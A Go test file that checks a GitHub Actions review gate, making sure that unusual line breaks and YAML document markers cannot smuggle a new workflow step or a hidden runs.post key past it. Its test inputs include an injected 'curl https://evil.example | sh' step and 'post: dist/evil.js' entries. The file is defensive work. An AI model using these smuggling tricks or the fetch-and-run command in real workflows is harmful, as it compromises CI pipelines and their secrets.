package actions

import (
	"errors"
	"strings"
	"testing"
)

// Regression tests for review finding 5, ported from the reviewer's
// TestReproCRWorkflow / TestReproCRActionYML: a line break other than LF
// (or CRLF) is a line break to GitHub's YAML parser but not to the gate's
// "\n" split, so one changed uses: line could carry a whole new step and a
// "# comment" could hide a runs.post key.

const (
	reproOld = "1111111111111111111111111111111111111111"
	reproNew = "2222222222222222222222222222222222222222"
)

var hiddenBreaks = []string{"\r", "\u0085", "\u2028", "\u2029", "\x0b", "\x0c"}

func TestReproCRWorkflow(t *testing.T) {
	old := "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@" + reproOld + " # v4.1.0\n"
	for _, br := range hiddenBreaks {
		nw := strings.Replace(old, reproOld+" # v4.1.0\n", reproNew+" # v4.2.0"+br+"      - run: curl https://evil.example | sh\n", 1)
		for _, sides := range [][2]string{{old, nw}, {nw, old}} {
			ch, errs := usesChanges(".github/workflows/ci.yml", kindWorkflow, sides[0], sides[1])
			if len(ch) != 0 || len(errs) != 1 || errs[0].code != codeLineBreak {
				t.Errorf("break %q: changes %d, errs %+v; want only a %s error", br, len(ch), errs, codeLineBreak)
			}
		}
	}
	// CRLF on both sides is an ordinary file.
	crlf := func(s string) string { return strings.ReplaceAll(s, "\n", "\r\n") }
	nw := strings.Replace(old, reproOld+" # v4.1.0", reproNew+" # v4.2.0", 1)
	ch, errs := usesChanges(".github/workflows/ci.yml", kindWorkflow, crlf(old), crlf(nw))
	if len(errs) != 0 || len(ch) != 1 || ch[0].new.comment != "v4.2.0" {
		t.Errorf("CRLF: changes %+v, errs %+v", ch, errs)
	}
}

func TestReproCRActionYML(t *testing.T) {
	old := "name: x\nruns:\n  using: node20\n  main: dist/index.js\n"
	if _, err := parseActionMeta(old); err != nil {
		t.Fatal(err)
	}
	for _, br := range hiddenBreaks {
		for _, nw := range []string{
			"name: x\nruns:\n  using: node20\n  main: dist/index.js # entry" + br + "  post: dist/evil.js\n",
			"name: x\nruns:\n  using: node20\n  main: dist/index.js\n  # c" + br + "  post: dist/evil.js\n",
		} {
			if m, err := parseActionMeta(nw); !errors.Is(err, errLineBreak) {
				t.Errorf("break %q: err %v (post %q), want errLineBreak", br, err, postOf(m))
			}
		}
	}
	if _, err := parseActionMeta(strings.ReplaceAll(old, "\n", "\r\n")); err != nil {
		t.Errorf("CRLF action.yml: %v", err)
	}
	// A second document after the end marker is not read past.
	for _, nw := range []string{
		"runs:\n  using: node20\n  main: dist/index.js\n...\n---\nruns:\n  using: node20\n  main: dist/index.js\n  post: dist/evil.js\n",
		"runs:\n  using: node20\n  main: dist/index.js\n...\nanything: [\n",
	} {
		if m, err := parseActionMeta(nw); err == nil {
			t.Errorf("content after '...' accepted (post %q)", postOf(m))
		}
	}
}

func postOf(m *actionMeta) string {
	if m == nil {
		return ""
	}
	return m.post
}

func TestCheckYAMLText(t *testing.T) {
	for _, ok := range []string{"", "a: b\n", "a: b\r\n", "\ufeffa: b\n", "a:\tb # caf\u00e9\n", "a: \u00a0b\n"} {
		if err := checkYAMLText(ok); err != nil {
			t.Errorf("%q: %v", ok, err)
		}
	}
	for _, bad := range []string{"a\rb", "a: b\r", "a\x00", "a\x1b[2J", "a\x7f", "a\u0085", "a\u009b", "a\u2028", "a\u2029", "a\ufeff", "a\xff\n"} {
		if err := checkYAMLText(bad); !errors.Is(err, errLineBreak) {
			t.Errorf("%q: err %v", bad, err)
		}
	}
}

// A '#' straight after the ref is part of the YAML scalar, not a comment
// (the reviewer's TestReproHashRef); such a line is not read as a uses: line.
func TestUsesHashWithoutSpace(t *testing.T) {
	if u, ok := parseUsesLine("      - uses: actions/checkout@" + reproNew + "#v4.2.0"); ok {
		t.Errorf("parsed ref %q comment %q", u.ref, u.comment)
	}
	if u, ok := parseUsesLine("      - uses: actions/checkout@" + reproNew + " #v4.2.0"); !ok || u.comment != "v4.2.0" {
		t.Errorf("spaced comment: %+v %v", u, ok)
	}
}
